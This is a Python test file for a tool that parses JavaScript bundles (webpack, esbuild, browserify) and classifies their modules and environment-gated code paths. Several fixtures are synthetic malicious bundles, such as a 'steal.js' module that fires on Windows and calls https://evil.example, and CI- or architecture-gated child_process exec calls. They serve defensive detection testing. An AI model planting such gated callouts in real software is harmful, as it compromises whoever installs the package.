import textwrap

from tools.common import bundles
from tools.common.tsparse import PARSERS

WEBPACK = textwrap.dedent("""
    (() => {
      var __webpack_modules__ = ({
        "./node_modules/chalk/index.js": ((module) => { module.exports = process.env.CI ? 1 : 2; }),
        "./src/install.js": ((module, exports, __webpack_require__) => {
          const os = __webpack_require__("os");
          if (os.platform() === "win32") { __webpack_require__("./src/steal.js").go(); }
        }),
        "./src/steal.js": ((module) => { module.exports.go = () => require("https").get("https://evil.example"); }),
      });
      function __webpack_require__(id) { return __webpack_modules__[id](); }
      __webpack_require__("./src/install.js");
    })();
""")
ESBUILD = textwrap.dedent("""
    var require_a = __commonJS({ "node_modules/a/index.js"(exports, module) { module.exports = 1; } });
    var require_main = __commonJS({ "src/main.js"(exports) { require_a(); } });
    require_main();
""")
BROWSERIFY = textwrap.dedent("""
    (function(){})()({1:[function(require,module,exports){ require('./two'); },{"./two":2}],
    2:[function(require,module,exports){ module.exports = 2; },{}],
    3:[function(require,module,exports){ },{}]},{},[1]);
""")


def ids(src):
    tree = PARSERS["js"].parse(src.encode())
    return [(u["kind"], u["module_id"], u["role"]) for u in bundles.units(tree, "dist/x.js")]


def test_webpack_units_and_roles():
    assert ids(WEBPACK) == [("webpack", "./node_modules/chalk/index.js", "library"),
                            ("webpack", "./src/install.js", "package"), ("webpack", "./src/steal.js", "package")]


def test_esbuild_and_browserify_units():
    assert ids(ESBUILD) == [("esbuild", "node_modules/a/index.js", "library"), ("esbuild", "src/main.js", "package")]
    assert [m for _, m, _ in ids(BROWSERIFY)] == ["1", "2", "3"]


def test_ordinary_objects_are_not_bundles():
    assert ids("const handlers = { a: () => 1, b: function () {} };") == []


def test_reexport_shims_are_library_even_with_numeric_ids():
    src = """var m = ({
      35317: ((t) => { t.exports = __WEBPACK_EXTERNAL_createRequire(import.meta.url)("child_process"); }),
      40088: ((t) => { t.exports = require("fs"); }),
      22551: ((t, r, n) => { const x = n(35317); if (process.env.CI) x.exec("whoami"); r.go = () => 1; }),
    });"""
    roles = {u["module_id"]: u["role"] for u in bundles.units(PARSERS["js"].parse(src.encode()), "dist/x.js")}
    assert roles["35317"] == "library" and roles["40088"] == "library"  # external/builtin shims
    assert roles["22551"] == "unknown"  # a numeric module with real code: not confidently package


def test_worst_role_precedence():
    from tools.analysis.gate_extract import worst_role
    assert worst_role({"package"}) == "package"
    assert worst_role({"package", "unknown"}) == "unknown"
    assert worst_role({"unknown", "library"}) == "library"


NUMERIC = """(() => {
  var m = {
    101: (e, t, n) => { /*! lodash v4 | MIT @license */ if (process.env.CI) { n(103); } },
    102: (e, t, n) => { const x = n(103); if (process.platform === 'win32') x.go(); },
    103: (e, t, n) => { t.go = () => require('https').get('https://evil.example/x'); },
    104: (e, t, n) => { if (process.arch === 'x64') { require('child_process').exec('y'); } },
  };
  function r(id) { var o = { exports: {} }; m[id](o, o.exports, r); return o.exports; }
  var port = parseInt("104");
  r(r.s = 102);
})();
"""


def test_numeric_webpack_entry_depth_and_banner():
    out = bundles.analyse(PARSERS["js"].parse(NUMERIC.encode()), "dist/x.js")
    by = {u["module_id"]: u for u in out["units"]}
    assert out["entries"] == ["102"] and out["require_names"] == ["r"]
    assert by["102"]["role"] == "package" and by["102"]["depth"] == 0  # the module the bootstrap starts from
    assert by["103"]["depth"] == 1 and by["103"]["role"] == "unknown"
    assert by["101"]["role"] == "library"  # licence banner
    assert by["104"]["depth"] is None  # never required from the entry
    assert by["102"]["requires"] == ["103"]
    (s,) = bundles.summary(out["units"], {("dist/x.js", None): out["entries"][0]})
    assert s["count"] == 4 and s["entry"] == "102" and s["by_role"] == {"library": 1, "package": 1, "unknown": 2}


def test_a_literal_call_that_is_not_the_bundle_require_does_not_load_a_unit(tmp_path):
    from tools.tests.analysis.test_gate_extract import extract
    res = extract(tmp_path, {"index.js": NUMERIC})
    exprs = {g["expression"]: g for g in res["gates"]}
    win = next(g for g in res["gates"] if any(c["id"] in g["expression"] and c["value"] == "win32"
                                             for c in res["conditions"]))
    assert win["reached"] and win["unit_depth"] == 0
    x64 = [c for c in res["conditions"] if c["value"] == "x64"]
    # parseInt("104") is not a module load, so unit 104 is only seen by the unresolved-function sweep
    assert x64 and not x64[0]["reached"]
    assert exprs


def test_objects_of_named_handlers_are_not_module_tables():
    src = "const h = { onMessage: (m) => m, onClose: function () {}, start: () => go(), 'stop': () => 1 };"
    assert ids(src) == []
